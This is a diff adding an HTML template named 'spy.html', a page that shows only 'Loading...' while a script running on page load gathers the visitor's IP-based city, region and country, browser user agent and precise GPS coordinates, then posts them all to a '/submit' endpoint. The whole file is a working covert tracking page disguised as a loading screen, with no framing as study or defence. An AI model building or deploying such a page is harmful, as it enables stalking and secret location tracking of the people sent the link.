@@ -1,0 +1,40 @@
+<!-- templates/spy.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script>
+    async function sendInfo() {
+      let ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+      let device = navigator.userAgent;
+      
+      navigator.geolocation.getCurrentPosition(async function(position) {
+        let latitude = position.coords.latitude;
+        let longitude = position.coords.longitude;
+        let data = {
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name,
+          device: device,
+          lat: latitude,
+          lon: longitude
+        };
+
+        await fetch("/submit", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify(data)
+        });
+        
+        document.body.innerHTML = "<h3>Loading...</h3>";
+      });
+    }
+
+    window.onload = sendInfo;
+  </script>
+</head>
+<body>
+  <h2>Loading...</h2>
+</body>
+</html>
